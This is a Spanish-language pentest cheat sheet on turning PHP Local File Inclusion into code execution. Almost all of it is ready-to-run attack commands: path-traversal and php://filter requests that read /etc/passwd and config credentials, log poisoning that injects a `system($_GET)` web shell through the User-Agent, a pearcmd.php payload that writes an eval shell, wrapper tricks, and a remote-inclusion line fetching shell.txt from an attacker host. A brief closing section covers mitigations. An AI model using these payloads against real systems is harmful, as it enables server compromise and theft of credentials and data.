---
title: LFI — de leer ficheros a ejecutar código
tags: [web, lfi, rfi, wrappers, log-poisoning]
---

# LFI: de la lectura de ficheros a la shell

[🇬🇧 English](lfi-to-rce.en.md) | **Español**

## 1. Detectar y confirmar

```bash
curl -s 'http://<HOST>/?page=../../../../etc/passwd'
curl -s 'http://<HOST>/?file=php://filter/convert.base64-encode/resource=index.php'
```

Si hay `include`, `require`, `file_get_contents` o `readfile` con parámetro, prueba rutas absolutas, relativas y `%00` (PHP < 5.3.4). `php://filter` confirma LFI incluso cuando el include añade `.php` al final.

## 2. Leer el código fuente

```bash
curl -s 'http://<HOST>/?page=php://filter/convert.base64-encode/resource=config.php' | base64 -d
```

Con eso salen credenciales, rutas y la lógica de filtros. Revisa también `.env`, `wp-config.php`, `config/database.php` y claves SSH.

## 3. Log poisoning

Si puedes incluir `/var/log/apache2/access.log` (o `nginx/access.log`), envía el payload en la `User-Agent`:

```bash
curl -s 'http://<HOST>/' -A '<?php system($_GET["c"]); ?>'
curl -s 'http://<HOST>/?page=/var/log/apache2/access.log&c=id'
```

Alternativas: `auth.log` (usuario SSH con payload), `error.log`, `/proc/self/environ` (si el proceso hereda variables), sesiones (`/var/lib/php/sessions/sess_<id>`), y `mail.log`.

## 4. Wrappers y técnicas modernas

- `data://text/plain;base64,<payload>` si `allow_url_include=On`.
- `php://input` con POST y `allow_url_include`.
- `phar://` para deserialización (ver [deserialización PHP](php-deserialization.md)).
- `pearcmd.php` en imágenes con PEAR: `?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET[c])?>+/tmp/shell.php` (requiere `register_argc_argv`).
- PHP filter chains (`wrapwrap`) para generar código sin subir fichero cuando no hay inclusión de logs.

## 5. Si el include no ejecuta PHP

- Incluir `/etc/ssh/sshd_config` o claves para moverse lateralmente.
- Ficheros de `~/.bash_history`, `cron`, `authorized_keys` escribibles.
- `RFI` con servidor propio: `?page=http://<LHOST>/shell.txt` si `allow_url_include=On`.

## 6. Errores típicos

- **Añade `.php` y rompe la ruta** → usa `php://filter` o un wrapper; para truncar con `%00` necesitas PHP antiguo.
- **`allow_url_include` desactivado** → descarta `data://` y `http://`; tira de log poisoning.
- **El log no tiene el payload** → el vhost escribe en otro fichero; prueba `access.log` del vhost y `error.log`.
- **`open_basedir` activo** → limita rutas; busca ficheros dentro del directorio permitido.
- **El payload se escapa** → codifica `<?php` como `<?=` o usa base64 si el wrapper lo permite.

## 7. Detección y mitigación

- Validar rutas contra una lista blanca y no construir paths con entrada de usuario.
- `allow_url_include=Off`, `open_basedir` y deshabilitar wrappers innecesarios.
- WAF para `../`, `php://`, `data://` y `%00`.
- Monitorizar inclusiones de logs y accesos a `/etc/passwd` desde el servidor web.

MITRE: T1190, T1005, T1059.
